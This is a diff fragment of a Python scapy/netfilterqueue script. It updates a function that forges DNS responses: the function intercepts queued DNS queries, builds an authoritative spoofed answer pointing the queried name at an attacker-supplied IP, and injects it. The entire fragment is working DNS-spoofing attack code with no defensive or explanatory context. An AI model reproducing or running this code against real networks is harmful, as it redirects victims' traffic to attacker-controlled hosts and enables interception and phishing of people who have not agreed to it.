@@ -17,7 +17,6 @@
 #!/usr/bin/env python3
 
 from scapy.all import *
-from netfilterqueue import NetfilterQueue
 
 #########################################################################################################
 # FUNCTION
@@ -44,12 +43,13 @@ from netfilterqueue import NetfilterQueue
 #	(none)
 #    
 #########################################################################################################
-def spoofed_pkt(payload, pkt, rIP):
-    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+def spoofed_pkt(nfpkt, pkt, rIP):
+    spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                   UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                   DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                   an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=rIP))
-    payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
+    nfpkt.set_payload(str(spoofed))
+    nfpkt.accept()
     print(pkt[DNSQR].qname[:-1])
 
 #########################################################################################################
